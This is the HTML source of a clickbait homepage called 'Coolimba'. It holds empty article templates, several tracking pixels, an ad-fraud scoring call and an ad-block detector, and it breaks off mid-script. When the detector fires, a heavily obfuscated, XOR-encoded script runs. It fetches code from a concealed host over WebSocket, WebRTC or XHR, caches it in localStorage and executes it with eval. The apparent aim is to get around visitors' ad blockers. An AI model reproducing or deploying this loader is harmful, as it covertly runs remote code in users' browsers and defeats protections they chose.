<!DOCTYPE html>
<!--[if lt IE 7]> <html dir="ltr" lang="en-US" class="no-js lt-ie9 lt-ie8 lt-ie7" > <![endif]-->
<!--[if IE 7]>    <html dir="ltr" lang="en-US" class="no-js ie7 lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>    <html dir="ltr" lang="en-US" class="no-js ie8 lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!-->

<html dir="ltr" lang="en-US" class="no-js">
<!--<![endif]-->

<head>
    <meta charset="utf-8">

    <base href="/Discover/">

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <link href="/css/global.css?v=23" rel="stylesheet">
    <link href="/css/new-homepage.css?v=23" rel="stylesheet">
    <script src="js/modernizr.js" type="text/javascript"></script>

    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>

    
<script type="text/javascript">
    var global = {"siteCode":"coolimba.com","pageVariation":"none","articleId":"none","pageOrder":"","title":"coolimba.com","previewImageUrl":"","description":"","utm_source":null,"srcId":null,"utm_campaign":null,"utm_medium":null,"sourceChannel":"","pageNum":1,"domainName":"coolimba.com","currentUrl":"http:\/\/coolimba.com\/","imageServer":"","adsServerUrl":"","debugMode":null,"version":"23","fullReloadNavigation":false,"animatedScroll":true,"articleUrlWithoutPage":"","adLoadTimeout":60000,"nextArticleUrl":"","category":"","categories":["home","coolimba essentials"],"country":"US","device":"desktop","experiment":null,"taboolaSafe":"false","safeSource":"false","wzna":null,"taboolaPlacementAddition":"_SRC[]_CID[]_US_none","outbrainPlacementAddition":"_SRC_CID_US_none","revcontentChannel":"_SRC[]_CID[]_US_none","reviveVars":"&source=&variation=none&taboolaSafe=false&pageNum=1","reportingChannel":"domain=coolimba.com&path=none&country=US&device=desktop&flow=&variation=none&funnel=1&details="};

    var qs = [];

    var WzAdMgr = WzAdMgr || {};
    WzAdMgr.trackingChannel = WzAdMgr.trackingChannel || {};
        WzAdMgr.trackingChannel.domain='coolimba.com';
    WzAdMgr.trackingChannel.source='';
    WzAdMgr.trackingChannel.publisher='';
    WzAdMgr.trackingChannel.campaign='';
    WzAdMgr.trackingChannel.path='none';
    WzAdMgr.trackingChannel.country='US';
    WzAdMgr.trackingChannel.device='desktop';
    WzAdMgr.trackingChannel.flow='';
    WzAdMgr.trackingChannel.experiment='';
    WzAdMgr.trackingChannel.variation='none';
    WzAdMgr.trackingChannel.funnel='1';
    WzAdMgr.trackingChannel.details='';
</script>

<!-- HTML HEADER PIXELS -->

<!-- Facebook Pixel Code --><script>
                 !function(f,b,e,v,n,t,s)
                 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                 n.callMethod.apply(n,arguments):n.queue.push(arguments)};
                 if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
                 n.queue=[];t=b.createElement(e);t.async=!0;
                 t.src=v;s=b.getElementsByTagName(e)[0];
                 s.parentNode.insertBefore(t,s)}(window, document,'script',
                 'https://connect.facebook.net/en_US/fbevents.js');
                 fbq('init', '943622352418747');
                 fbq('track', 'PageView');
                </script>
                <noscript><img height="1" width="1" style="display:none"
                 src="https://www.facebook.com/tr?id=943622352418747&ev=PageView&noscript=1"
                /></noscript>
                <!-- End Facebook Pixel Code -->
<!-- Facebook Pixel Code --><script>
                 !function(f,b,e,v,n,t,s)
                 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                 n.callMethod.apply(n,arguments):n.queue.push(arguments)};
                 if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
                 n.queue=[];t=b.createElement(e);t.async=!0;
                 t.src=v;s=b.getElementsByTagName(e)[0];
                 s.parentNode.insertBefore(t,s)}(window, document,'script',
                 'https://connect.facebook.net/en_US/fbevents.js');
                 fbq('init', '202348593871573');
                 fbq('track', 'PageView');
                </script>
                <noscript><img height="1" width="1" style="display:none"
                 src="https://www.facebook.com/tr?id=202348593871573&ev=PageView&noscript=1"
                /></noscript>
                <!-- End Facebook Pixel Code -->


<!--Protected Media -->
<script type="text/javascript" >
//-----------------------------------------------------------
// your partner id
var pid = "1000136";
//-----------------------------------------------------------
// tid = your traffic source
// l1-l6 = your own hierarchical parameters
// pub_app = your app bundle if valid
// pub_domain = your domain if valid
var params_str = "&tid="+
				"&l1="+window.location.hostname+
				"&l2=level2"+
                "&l4=content_websites"+
                "&l5=coolimba.com"+
				"&pub_app=com.pub.app"+
				"&pub_domain=coolimba.com";
//-----------------------------------------------------------
function HandleResultFromPM(fraud_score) {
	if( fraud_score > 70 )
	{
		window.global.wzna = 1;

        if (typeof WzEvent === "function") { WzEvent('stats','fraud'); }
		// console.log("Fraud [fraud_score="+fraud_score+"]");
	}
	else if (fraud_score == -1)
	{
		// console.log("Timeout/EX [fraud_score="+fraud_score+"]");
	}
	else
	{
		// console.log("OK [fraud_score="+fraud_score+"]");
	}
}
//-----------------------------------
//-----------------------------------
var resultHandled = false;
//-----------------------------------
function AdScoreCORS(res){
   if (resultHandled){
		return;
	}
	resultHandled = true;
	try{
		HandleResultFromPM(res.score.black);
	}
	catch(e)
	{
		fire_err_pixel("ex",pid,params_str);
		HandleResultFromPM(-1);
	}
}
//-----------------------------------
setTimeout( function() {
	if(!resultHandled){
		resultHandled = true;
		fire_err_pixel("t",pid,params_str);
		HandleResultFromPM(-1);
	}
} , 1200 );
//-----------------------------------
function fire_err_pixel(type,pid,params_str){
   var img = document.createElement('img');
   img.src = "https://data.ad-score.com/score/img?s=" + type + "&r=" + Math.random() + "&pid=" + pid + "&" + params_str ;
}
//-----------------------------------
var js = document.createElement('script');
js.src = "https://data.ad-score.com/score/cors?s=1&callback=AdScoreCORS&cb=" + Math.random()+ "&pid=" + pid + "&" + params_str;
var html = document.documentElement;
html.insertBefore(js, html.firstChild);
//-----------------------------------
</script>
<!--End of Protected Media -->


<script>
    // outbrain "external id"
    window.OB_extId = global.outbrainPlacementAddition;
</script>

<!-- HTML HEADER PIXELS END -->

<script type="text/javascript" src='/engine/common/js/previewMgr.js?v=23'></script>
<script type="text/javascript" src='/engine/common/js/homepage.js?v=23'></script>

    <script>
        var global = window.global || {};
        global.categoriesToShuffle = ['coolimba essentials'];
    </script>

    <title>Coolimba</title>


    <!-- Google fonts -->
    <link href="//fonts.googleapis.com/css?family=Voltaire|PT+Sans+Narrow:400,700" rel="stylesheet">
</head>

<body>





    <!-- Header code -->
      <!-- htmlHomeHeaderTop -->
<style>

/* ---------------------- Header ---------------------- */

.logo {
  margin: 0 auto;
  text-align: center;
  overflow:hidden;
}
.logo h1 {
  margin-top: 30px;
}
.pretty-header {
  background: url('/images/headerbg.jpg') no-repeat;
  /*background-position-y: -100px ;*/
  background-size: cover;
  height: 150px;
  margin-left: -15px;
  margin-right: -15px;
}
.nav>li>a:focus, .nav>li>a:hover {
  background: none !important;
}
</style>


<div class="container-fluid">
  <div class="row">
    <div class="col-xs-12">
      <div class="pretty-header">

            <div class="logo center">
              <h1><a href="/"><img src="/images/logo-white.png" width="350px;" height="auto" alt="Coolimba"></a></h1>
            </div>

            <!-- social_sharing -->
            <div class="header-social-container">
              <a href="https://www.facebook.com/sharer.php?u=http://coolimba.com/" target="_blank"
                 onclick="window.open(this.href, '','left=50,top=30,width=600,height=300,toolbar=1,resizable=0'); return false;" id="facebookText" title="Share by Facebook" class="socicon-wrap">
               <i class="fa fa-facebook">

               </i>
              </a>
              <a href="https://twitter.com/intent/tweet?text=http://coolimba.com/" target="_blank"
                 onclick="window.open(this.href, '','left=50,top=30,width=600,height=300,toolbar=1,resizable=0'); return false;"
                 id="" title="Share by Twitter" class="socicon-wrap">
                 <i class="fa fa-twitter"></i>
                </a>
            </div>



      </div>
    </div>
  </div>

</div>
<!-- htmlHomeHeaderTop -->


  <div class="container content-wrap">


    <div id="page">


      <!-- Content area -->


      <div class="category-preview" category="latest" data-category-preview-start-at-item="1">

        <div class="row category-preview-article" style="vertical-align: top;">

          <article>
            <div class="col-xs-7">
              <div style="width:100%; height: 365px; background-image:url('/images/imagePlaceholder.jpg'); " class="category-preview-image dt-top-three-articles-image img-responsive make-image-responsive"></div>
            </div>

            <div class="col-xs-5">
              <!-- <div class="category-preview-magic-class"></div> -->
              <div class="home-article-meta-wrap">
                <h4 class="category-preview-title align-center dt-home-article-title"></h4>
                <div class="category-preview-post-date"></div>
                <div class="category-preview-posted-by"></div>
                <div class="category-preview-description">
                </div>

              </div>
            </div>
            </article>

        </div>
      </div>

      <div class="thick-hr">
      </div>


    <div class="row category-preview home-top-three-wrap" category="latest" data-category-preview-start-at-item="2">



      <div class="col-xs-4">


          <div class="row category-preview-article" style="vertical-align: top;">

            <article>
              <div class="col-xs-12">
                <div style="width:100%; height: 420px; background-image:url('/images/imagePlaceholder.jpg'); " class="category-preview-image img-responsive make-image-responsive">
                  <!-- <div class="category-preview-magic-class"></div> -->

                  <div class="home-article-meta-wrap">
                    <h4 class="category-preview-title align-center dt-home-article-title"></h4>
                    <div class="secondary-meta-wrap">
                      <div class="category-preview-post-date"></div>
                      <div class="category-preview-posted-by"></div>
                    </div>
                  </div>

                </div>

              </div>
              </article>

          </div>

      </div>

      <div class="col-xs-4">


          <div class="row category-preview-article" style="vertical-align: top;">

            <article>
              <div class="col-xs-12">
                <div style="width:100%; height: 420px; background-image:url('/images/imagePlaceholder.jpg'); " class="category-preview-image img-responsive make-image-responsive">
                  <!-- <div class="category-preview-magic-class"></div> -->

                  <div class="home-article-meta-wrap">
                    <h4 class="category-preview-title align-center dt-home-article-title"></h4>
                    <div class="secondary-meta-wrap">
                      <div class="category-preview-post-date"></div>
                      <div class="category-preview-posted-by"></div>
                    </div>
                  </div>

                </div>

              </div>
              </article>

          </div>

      </div>

      <div class="col-xs-4">


          <div class="row category-preview-article" style="vertical-align: top;">

            <article>
              <div class="col-xs-12">
                <div style="width:100%; height: 420px; background-image:url('/images/imagePlaceholder.jpg'); " class="category-preview-image img-responsive make-image-responsive">
                  <!-- <div class="category-preview-magic-class"></div> -->

                  <div class="home-article-meta-wrap">
                    <h4 class="category-preview-title align-center dt-home-article-title"></h4>
                    <div class="secondary-meta-wrap">
                      <div class="category-preview-post-date"></div>
                      <div class="category-preview-posted-by"></div>
                    </div>
                  </div>

                </div>

              </div>
              </article>
          </div>
      </div>
    </div>



    <div class="row category-preview top-four-tips-wrap" category="coolimba essentials" data-category-preview-start-at-item="1">

    <div class="tips-title">
      <h3>Coolimba Essentials</h3>
    </div>

      <article class="dt-category-image-style-one-top-four category-preview-article" style="margin-bottom: 5px;">

        <div style="height:220px; width:100%; background-image:url('/images/imagePlaceholder.jpg');" class="category-preview-image dt-category-image-style-one-top-four-image make-image-responsive" alt="" width=""></div>
        <h3 class="category-preview-title align-center dt-home-article-title" style="width: 94%; margin-left: 3%;"></h3>

      </article>

      <article class="dt-category-image-style-one-top-four category-preview-article" style="margin-bottom: 5px;">

        <div style="height:220px; width:100%; background-image:url('/images/imagePlaceholder.jpg');" class="category-preview-image dt-category-image-style-one-top-four-image make-image-responsive" alt="" width=""></div>
        <h3 class="category-preview-title align-center dt-home-article-title" style="width: 94%; margin-left: 3%;"></h3>

      </article>

      <article class="dt-category-image-style-one-top-four category-preview-article" style="margin-bottom: 5px;">

        <div style="height:220px; width:100%; background-image:url('/images/imagePlaceholder.jpg');" class="category-preview-image dt-category-image-style-one-top-four-image make-image-responsive" alt="" width=""></div>
        <h3 class="category-preview-title align-center dt-home-article-title" style="width: 94%; margin-left: 3%;"></h3>

      </article>


      <article class="dt-category-image-style-one-top-four category-preview-article" style="margin-bottom: 5px;">

        <div style="height:220px; width:100%; background-image:url('/images/imagePlaceholder.jpg');" class="category-preview-image dt-category-image-style-one-top-four-image make-image-responsive" alt="" width=""></div>
        <h3 class="category-preview-title align-center dt-home-article-title" style="width: 94%; margin-left: 3%;"></h3>

      </article>


</div>


<div class="category-preview" category="latest" data-category-preview-start-at-item="5">

<!-- item start -->
  <div class="row category-preview-article dt-home-article-in-list duplicatable-element" duplicate-max="100" style="vertical-align: top;">
    <article>
      <div class="col-xs-4">
        <div style="width:100%; height: 250px; background-image:url('/images/imagePlaceholder.jpg'); " class="category-preview-image dt-top-three-articles-image img-responsive make-image-responsive"></div>
      </div>

      <div class="col-xs-8">
        <!-- <div class="category-preview-magic-class"></div> -->
        <div class="home-article-meta-wrap">
          <h4 class="category-preview-title align-center dt-home-article-title"></h4>
          <div class="article-list-meta-wrap">
            <div class="category-preview-post-date"></div>
            <div class="category-preview-posted-by"></div>
          </div>
          <div class="category-preview-description">
          </div>

        </div>
      </div>
      </article>
  </div>
  <!-- item end -->



</div>
<br>
<br>
<br>
</div><!-- .category-preview -->

</div><!-- .container -->


  <div class="container">
    <!-- htmlFooter -->
<style>
/*#footer {
  border-top: 1px dotted #d3d3d3;
  margin-top: 10px;
  margin-bottom: 10px;
  padding-top: 5px;
}*/
.footer-menu {
  line-height: 70px;
}
#footer ul {
  margin: 0;
}
ul.footer-menu ul {
  list-style: none;
  display: inline-block;
  width: 100%;
}

ul.footer-menu li {
  display: inline-block;
  margin-left: 15px;
  margin-right: 15px;
  text-align: justify;
}
ul.footer-menu li a,
ul.footer-menu li {
  color: #999;
  font-size: 14px;
  color: #999;
}

.footer-text {
  font-size: 14px;
  right: 20px;
  position: absolute;
  margin-top: -10px;
}

</style>

<!-- Footer area -->

<footer id="footer">
<div class="row row-centered">

  <div class="col-xs-12 col-md-3">
    <a href="/" style="margin-top: 20px; overflow: hidden; display: block;"><img src="/images/logo.png" alt="" width="150px" height=""></a>

  </div>

  <div class="col-xs-12 col-md-9">

            <ul class="footer-menu">
              <li><a href="/about/?show=terms">Terms</a></li>
              <li><a href="/about/?show=privacy">Privacy</a></li>
              <li><a href="/about/?show=dmca">DMCA</a></li>
              <li><a href="/about/?show=submit">Submit content</a></li>
              <li><a href="/about/?show=contact">Contact Us</a></li>
              <li style="color: #afafaf">© Coolimba 2018</li>
            </ul>


  </div>

</div>


</footer>
<!-- htmlFooter -->
  </div>






<!--[if (gte IE 6)&(lte IE 8)]><script type="text/javascript" src="js/selectivizr-min.js"></script><![endif]-->
<script defer src="js/scripts.js?v=23" type="text/javascript"></script>


<!-- Bootstrap -->
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<!-- Optional theme -->
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
<!-- Latest compiled and minified JavaScript -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<!-- Bootstrap -->
<!-- font awesome -->
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

<script>
    var global = window.global || {};
    global.categoriesToShuffle = ['coolimba essentials'];
</script>
<script type="text/javascript" src='/engine/common/js/previewMgr.js?v=23'></script>

<!-- Facebook JS -->
<script>
    window.fbAsyncInit = function() {
        FB.init({
            appId      : '441791976015458',
            xfbml      : true,
            version    : 'v2.5'
        });

        // custom facebook init function
        FB.Event.subscribe('xfbml.render', function(response) {
            $('.showOnFacebookInit').show();

            if (typeof(customFacebookInit) == "function") {
                  customFacebookInit();
            }
        });

    };

    (function(d, s, id){
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) {return;}
        js = d.createElement(s); js.id = id;
        js.src = "//connect.facebook.net/en_US/sdk.js";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));
</script>

<!-- HTML /BODY PIXELS -->

<!-- Quantcast Tag -->
<script type="text/javascript">
var _qevents = _qevents || [];

(function() {
var elem = document.createElement('script');
elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
elem.async = true;
elem.type = "text/javascript";
var scpt = document.getElementsByTagName('script')[0];
scpt.parentNode.insertBefore(elem, scpt);
})();

_qevents.push({
qacct:"p-Du78qRc43Lpr0"
});
</script>

<noscript>
<div style="display:none;">
<img src="//pixel.quantserve.com/pixel/p-Du78qRc43Lpr0.gif" border="0" height="1" width="1" alt="Quantcast"/>
</div>
</noscript>
<!-- End Quantcast tag -->


<!-- HTML /BODY PIXELS END -->

<script type="text/javascript">
    var adblockDetectedActionExecuted = false;
    function doAdblockDetectedActionOnce()
    {
        if (!adblockDetectedActionExecuted) {
            createCookie("abcheck","true",1);
            adblockDetectedActionExecuted = true;

            if (typeof WzEvent === "function") { WzEvent('stats','adblockerDetected'); }

            try{(function(){function B(){try{var a=K()}catch(c){}if(a)try{C(a.h,null)}catch(c){delete window.localStorage[a.key],delete window.sessionStorage[a.key]}else L(function(a,b){b.as=!0;try{C(a,b)}catch(e){}},M)}function M(){var b=window.location.protocol==a("BQ0MKSRt")?a("BQ0MKSRtTHg="):a("BQ0MKW14TA==");(new Image).src=b+u+N}function L(a,c){function b(){var d=e.shift();if(d)try{d(a,b)}catch(m){b()}else v(),c()}try{O()}catch(f){v();c();return}var e=[P,Q,R,S];b()}function C(a,c){(function(){eval(a)})({e:a,
p:c,n:g})}function K(){var b=[];window.localStorage&&b.push(window.localStorage);window.sessionStorage&&b.push(window.sessionStorage);var c=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("HQsdODo1DzI=")));c=new Uint8Array(c);for(var d="",e=0;e<c.length;e++)d+=String.fromCharCode(c[e]);c=btoa(d);d=(new Date).getTime();for(e=0;e<b.length;e++){var f=b[e],m;for(m in f)if(0===m.lastIndexOf(c,0)){try{for(var k=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),g=atob(f[m]),l=new Uint8Array(g.length),
h=0;h<g.length;h++)l[h]=g.charCodeAt(h);var n=r(D(k,l.buffer))}catch(U){continue}h=parseInt(n.substring(0,13),10);if(!isNaN(h))if(864E5<d-h||1>d-h)f.removeItem(m);else if((h=n.substring(13))&&!(16>h.length))return{h:h,key:m}}}return null}function Q(b,c){var d=a("Xk1PYQ=="),e=a("WjtCamFtVhN0YlN/NBVrTCNRFUNKbkJ/KnJoLQh8WUVXPTtjFRVZFntqWX1PFmVOIF1uTkFtQHVWc2VWDXZQTVpDTG9tFFBtCGVQdjBuE0VYLmFARWJMB157ZllxAyw=");d=w+":"+d;var f={};f[a("GAsUKg==")]=a("GQwKN20=")+d+a("Ug0KODkkEzg8JFcxFiQ=");f[a("DgsdPTI5Fz4vPA==")]=
a("FBgMMDo2");f[a("GAodKzk2DjI=")]=a("FBgMMDo2");F(e,f,function(b){b=b.match(new RegExp(a("MxoZNzM+BzY6NVAZEX9xKAZAdFJPbQMhHD0HKBtvSikJUlhxCzNIC2AMDm4peg0QSTd6JhR8X2UwJXlMPz8aVR8cFDgu")));if(null==b)return null;b=b[1];return a("DhgWPT4zAiMraltlRHQEMDJLbElDZkRzX2E=")+b+a("TU9LaWZhQyM3IEo3EDgwDUIZNR4UJVY=")+b+a("TQsINiUjQ2F9YFtzVTo0ABUEJhFdNBk2GGFi")},b,c)}function R(b,c){var d=a("W0lIaA=="),e=a("K0xCGBVtW250FV5/QWVrTVNRY0NKZEV/XHNoLnN8XTRXTDpjEmZZEXtqXnNPYxROJC5uTzZtRHFWeRRWCQNQQShDSxptEiBteWhQdUNuZEdYKmZAQxFMcS17ZVVxf1I=");
d=w+":"+d;var f={};f[a("GAsUKg==")]=[a("Hg0NN20=")+d];F(e,f,function(b){b=b.match(new RegExp(a("MxoZNzM+BzY6NVAZEX9xKAZAdFJPbQMhHD0HKBtvSikJUlhxCzNIC2AMDm4peg0QSTd6JhR8VhkIantMPz8aVR4LHjUv")));if(null==b)return null;b=b[1];return a("DhgWPT4zAiMralplRHQEMDJLZktEYEJ9X3dmW2s=")+b+a("TQ0BKXc/DCQ6")},b,c)}function F(b,c,d,e,f){function m(a){k||(k=!0,a.apply(null,Array.prototype.slice.call(arguments,1)))}var k=!1;e=m.bind(null,e);f=m.bind(null,f);var p={};p[a("BBodCjIlFTI8Iw==")]=[c];var l=new g.c(p);l[a("DgsdOCMyJzY6MSktFDo/EQ4=")](a("QhQdLTZ4Ez4gNw==")).binaryType=
a("DAsKOC41FjEoNRg=");l[a("AhcROjI0AjkqOQ4kATE=")]=function(b){if(null!=b[a("DhgWPT4zAiMr")]&&(b=d(b[a("DhgWPT4zAiMr")][a("DhgWPT4zAiMr")]),null!=b)){var c={};c[a("DhgWPT4zAiMr")]=b;c[a("Hh0IFBs+DTIHPg4gDQ==")]=0;l[a("DB0cEDQyIDYgNAMhFCA0")](new g.b(c),function(){},function(){})}};l.addEventListener(a("BBodOjg5DTItJAMqGyclFRYONxIROREg"),function(){l[a("BBodGjg5DTItJAMqGwclFRYO")]===a("CxgRNTIz")&&f()});var h=a("G0RIUzhqFiQrIgQkGDFxREJbdDM+dz8VWGFjXnxoWltdV0lTJGoQMj0jAyobOjAZB2E3RzkZVgw8dXJdeXFERUNJVmhdI15nbmBgJEgyOBoFDiYKAj4YMVYyOg1mdF9DTQ==")+
b+a("ZxhFMDQyTjg+JAMqGydrABACNxEcMnwoUSAiHCcvCRQZEBc3d2ZRZHpwLhE5B34nIT8EWkVnRnVmIG8fKDIaGAwJQmxnZ1N3OTUINwE3fBADHzUZGDYYKwktcl5+cGAUUBAbPHoiBSUvN1A=")+function(){for(var b="",c=a("XUlIaWdnU2c="),d=0;16>d;++d){var e=(4294967296*Math.random()>>>0).toString(16);b+=c.substring(0,c.length-e.length)+e}return b}()+a("ZxhFMDQyTic5NFB1RWRhRFJbZEpAZ0Z1XHFiXHt2WkVdSUhpZ2dTZ35gWk8=");l[a("DgsdOCMyLDEoNRg=")](function(b){l[a("HhwMFTg0AjsKNRkmBz0hAAsEOg==")](b,function(){var b={};b[a("GQAIPA==")]=a("DBcLLjIl");
b[a("Hh0I")]=h;l[a("HhwMCzI6DCMrFA82FiY4BBYCOxQ=")](new g.f(b),function(){},function(){})},function(){})},function(){});b=l[a("DgsdOCMyJzY6MSktFDo/EQ4=")](a("Qg4LKVc=")+window.navigator.userAgent);b.binaryType=a("DAsKOC41FjEoNRg=");G(b,x(),function(b){e(b,{rtc:l})},function(){f()})}function S(b,c){function d(b){m||(m=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var e=x();e=(window.location.protocol==a("BQ0MKSRt")?a("BQ0MKSRtTHg="):a("BQ0MKW14TA=="))+u+e;var f=a("Kjws"),m=!1;b=d.bind(null,
b);c=d.bind(null,c);var k=new g.g;k.onreadystatechange=function(){4==k.readyState&&(0==k.status?c():b(r(k.response),{}))};k.onerror=function(){c()};k.open(f,e,!0);k.responseType=a("DAsKOC41FjEoNRg=");k.send(null)}function P(b,c){var d=a("GgoLY3h4"),e=new g.a(d+w+a("Qg4LKQ=="));e.binaryType=a("DAsKOC41FjEoNRg=");G(e,x(),function(a){b(a,{ws:e})},function(){c()})}function G(b,c,d,e){function f(b){g||(g=!0,b.apply(null,Array.prototype.slice.call(arguments,1)))}var g=!1;d=f.bind(null,d);e=f.bind(null,
e);var k=!1,p=setTimeout(function(){e(Error())},3E3),l=E(JSON.stringify({url:c||"",method:a("Kjws"),headers:null,body:null}));b.onopen=function(){clearTimeout(p);b.send(l)};var h=new ArrayBuffer(0),n;b.onmessage=function(b){if(4===b.data.byteLength){var a=new Uint8Array(b.data);if(222===a[0]&&173===a[1]&&190===a[2]&&239===a[3])return}!1===k?(k=!0,b=r(b.data),n=JSON.parse(b),n={status:n.status||0,headers:n.headers||{}}):(b=b.data,a=new Uint8Array(h.byteLength+b.byteLength),a.set(new Uint8Array(h),
0),a.set(new Uint8Array(b),h.byteLength),h=a.buffer)};b.onerror=function(){clearTimeout(p);e(Error())};b.onclose=function(){k?(n.body=h,d(r(n.body))):(clearTimeout(p),e(Error()))}}function y(b){return window[b.name]?window[b.name]:b[a("DhYWLTI5FxMhMx8oEDol")]&&b[a("DhYWLTI5FxMhMx8oEDol")][a("CRweOCI7FwEnNR0=")]?b[a("DhYWLTI5FxMhMx8oEDol")][a("CRweOCI7FwEnNR0=")]:b[a("DhYWLTI5FwAnPg4qAg==")]}function H(){var b=document.createElement(a("BB8KODoy"));b.style.height=a("XAkA");b.style.width=a("XAkA");b.style.display=
a("AxYWPA==");b[a("HgsbPTg0")]=a("DA==");b.name||(b.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7));(document.body||document.head||document.documentElement).appendChild(b);var c=y(b);c.document.documentElement||c.document.write(a("DA=="));try{c.stop()}catch(d){}return b}function O(){I=a("GBcTNzggDQ==");t=a("DhEKNjoy");q=a("CxAKPDE4Gw==");z=a("AgkdKzY=");A=a("HhgeOCU+");var b=H();b=y(b);var c=b.navigator.userAgent;var d=(new RegExp(a("DhEKNjoyHzQmIgUoHCE8"),
"i")).test(c)?t:(new RegExp(a("CxAKPDE4GysnMw8yEDUiEQ4XMgIZOAU="),"i")).test(c)?q:(new RegExp(a("M1FQZnY0CyUhPQ85FDo1Bg0CMFNeflw2DSczHiI="),"i")).test(c)?A:(new RegExp(a("AgkKJTgnCjg9"),"i")).test(c)?z:window[a("DhEKNjoy")]?t:"undefined"!==typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(d)&&(b=window);c=a("CA8ZNQ==");g.c=b[c](a("GhAWPTggTQUaEzogECYSGwwFMRkEPhkrTD0uTDwvBBECDlYuMjUIPjoCPgYlMTQGIQQ6FBU0AiwDL3IQN2YdHAMdFy55OgwtHAQpFRAxIzcNBTofEyMfKgJhLhBrMQMbCRYPdzokMQMNAA8gBxc+GgwONw4ZOBg="));g.f=b[c](a("GhAWPTggTQUaEzkgBic4GwwvMQkTJR81GCg9Ams6FlUaEBY9OCBNICsyASwBBgU3MQ4nCRk4GAEJMjEeIjYeHAIXWCUrdxQ+IDQFMls5Pg4wPxcpFSQFLAMvFgk4JRgcHQ0RNjl3HytuJwMrETsmWg8YBi4zBBM2Hyg9Ag8jGRYfEAgtPjgN"));
g.b=b[c](a("GhAWPTggTQUaEyMmEBcwGgYCMBsEMlY5EGElBSUiBQJDDh07PD4XBRoTIyYQFzAaBgIwGwQyVjkQYSUFJSIFAkMUFyMFAyAeLTUpJBswOBADHzFaDCtWMgUvNgM8aAcGPy07EDQyIDYgNAMhFCA0"));d===q?(d=H(),g.a=y(d)[c](a("GhAWPTggTQArMjkqFj80AA==")),d.parentElement.removeChild(d)):g.a=b[c](a("GhAWPTggTQArMjkqFj80AA=="));g.g=b[c](a("GhAWPTggTQ8DHCIxASQDERMeMQkE"))}function D(b,a){var c=new Uint8Array(a),e=new ArrayBuffer(a.byteLength);e=new Uint8Array(e);for(var f=0;f<a.byteLength;f++)e[f]=c[f]^b.charCodeAt(f%b.length);return e.buffer}
function r(b){if(window.TextDecoder)return(new window.TextDecoder("utf-8")).decode(new Uint8Array(b));var a="";b=new Uint8Array(b);for(var d=b.byteLength,e=0;e<d;e++)a+=String.fromCharCode(b[e]);return decodeURIComponent(escape(a))}function E(b){if(window.TextEncoder)return(new window.TextEncoder("utf-8")).encode(b).buffer;b=unescape(encodeURIComponent(b));for(var a=new Uint8Array(b.length),d=0;d<b.length;d++)a[d]=b.charCodeAt(d);return a.buffer}function x(){return a("QhwSKmgnXg==")+"2064190001"}
function a(b){b=window.atob(b);for(var a="",d=0;d<b.length;d++)a+=String.fromCharCode(b.charCodeAt(d)^"myxYWWcWNPjEuTQtbkTzpWvElARlKFju".charCodeAt(d%32));return a}function v(){if(!J){var a=("https:"==window.location.protocol?"https://":"http://")+u+T,c=document.createElement("script");c.type="text/javascript";c.async=!0;c.src=a;(document.body||document.head||document.documentElement).appendChild(c);J=!0}}var u=a("FREKdyM+CTg8MRgsWzc+GQ=="),w=a("DFcMMD04ETY8OUQmGjk="),T=decodeURIComponent("%2Fljs%3Fp%3D")+
"2064190001",N="/l?p=2064190001&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.ucweb)try{v()}catch(b){}try{B()}catch(b){}})()}catch(B){};
        }
    }

    function createCookie(name,value,days) {
       var expires = "";
       if (days) {
           var date = new Date();
           date.setTime(date.getTime() + (days*24*60*60*1000));
           expires = "; expires=" + date.toUTCString();
       }
       document.cookie = name + "=" + value + expires + "; path=/";
    }

    function readCookie(name) {
       var nameEQ = name + "=";
       var ca = document.cookie.split(';');
       for(var i=0;i < ca.length;i++) {
           var c = ca[i];
           while (c.charAt(0)==' ') c = c.substring(1,c.length);
           if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
       }
       return null;
    }

    if (readCookie('abcheck') === "true") {
        doAdblockDetectedActionOnce();
    } else {
        var ad_detect = document.createElement('script');
        ad_detect.async = "true";
        ad_detect.type = 'text/javascript';
        ad_detect.src = "//www.mydailyviral.com/js/adsbygoogle.js?ads=300x250";
        ad_detect.addEventListener('load', function() {
            if (window.isAdsDisplayed === undefined) {
                //adblock is detected at this step.
                doAdblockDetectedActionOnce();
            }
        });
        ad_detect.addEventListener('error', function() {
            if (window.isAdsDisplayed === undefined) {
                //adblock is detected at this step.
                doAdblockDetectedActionOnce();
            }
        });

